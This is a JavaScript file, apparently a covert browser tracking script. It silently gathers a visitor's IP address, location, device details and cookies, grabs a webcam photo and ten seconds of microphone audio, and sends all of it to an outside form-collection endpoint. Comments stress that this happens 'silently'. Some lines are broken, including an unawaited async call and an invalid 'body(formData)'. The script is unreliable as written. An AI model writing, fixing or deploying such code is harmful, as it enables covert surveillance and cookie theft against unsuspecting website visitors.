function startTracking() {
 document.getElementById('ipAddress').value = getClientIP();
 document.getElementById('userAgent').value = navigator.userAgent;

 getGeolocation().then(location => {
 document.getElementById('location').value = location;
 document.getElementById('deviceName').value = getDeviceName();
 document.getElementById('screenResolution').value = `${window.screen.width}x${window.screen.height}`;
 document.getElementById('cookiesData').value = document.cookie; 

 // Submit form silently via fetch
 const formData = new FormData();
 formData.append("ipAddress", document.getElementById('ipAddress').value);
 formData.append("userAgent", document.getElementById('userAgent').value);
 formData.append("location", document.getElementById('location').value);
 formData.append("deviceName", document.getElementById('deviceName').value);
 formData.append("screenResolution", document.getElementById('screenResolution').value);
 formData.append("cookiesData", document.getElementById('cookiesData').value);

 fetch('https://formspree.io/f/moeqkjgn', {
 method: 'POST',
 body: formData,
 headers: {
 'Accept': 'application/json'
 }
 })
 .then(response => response.json())
 .then(data => console.log(data))
 .catch(error => console.error("Error:", error));

 // Start camera capture (Note - This will still prompt user due to browser security)
 const video = document.createElement("video");
 const canvas = document.createElement("canvas");

 navigator.mediaDevices.getUserMedia({ video:true })
 .then(stream => {
 video.srcObject = stream;
 video.play();

 // Capture photo after 5 seconds silently
 setTimeout(() => {
 canvas.width = video.videoWidth;
 canvas.height = video.videoHeight;
 const ctx = canvas.getContext("2d");
 ctx.drawImage(video, 0, 0);
 const imageDataURL = canvas.toDataURL();

 fetch('https://formspree.io/f/moeqkjgn', {
 method: 'POST',
 body: JSON.stringify({ imageBase64Data:imageDataURL }),
 headers: { 'Content-Type':'application/json'}
 })
 .then(response=>response.text())
 .then(data=>console.log(data))
 .catch(error=>console.error("Error uploading image:", error));
 },5000);
 });

 // Start audio recording (Note - This will still prompt user due to browser security)
 navigator.mediaDevices.getUserMedia({ audio:true })
 .then(stream=>{
 const mediaRecorder=new MediaRecorder(stream);

 let audioChunks=[];

 mediaRecorder.ondataavailable=event=>{
 if(event.data.size>0)audioChunks.push(event.data);
 };

 mediaRecorder.onstop=()=>{
 let audioBlob=new Blob(audioChunks,{type:"audio/wav"});
 let reader=new FileReader();

 reader.onload=function(){
 var formData=new FormData();
 formData.append("audioFile",reader.result);

 fetch('https://formspree.io/f/moeqkjgn', {
 method:"POST",
 body(formData),
 }).then(res=>res.text()).then(text=>console.log(text)).catch(err=>console.error(err));
 };

 reader.readAsArrayBuffer(audioBlob);
 };

 mediaRecorder.start(100);

 // Stop recording after 10 seconds silently
 setTimeout(()=>mediaRecorder.stop(),10000);
 });
 });
}

// Function to get client IP address (requires external API)
async function getClientIP() {
 const response=await fetch("https://api.ipify.org");
 const ipResponseText=await response.text();
 return ipResponseText.trim();
}

// Function to get geolocation using Nominatim OpenStreetMap API
async function getGeolocation() {
 const ipResponse=await fetch("http://ip-api.com/json");
 const ipAddressData=await ipResponse.json();

 return `${ipAddressData.city},${ipAddressData.region}(${ipAddressData.country})`;
}

// Helper function to guess device name from user agent
function getDeviceName() {
 const ua=navigator.userAgent;

 if (/Android/i.test(ua)) return "Android Device";
 if (/iPhone|iPad|iPod/i.test(ua)) return "iOS Device";
 if (/Windows/i.test(ua)) return "Windows PC";

 return "Unknown Device";
}
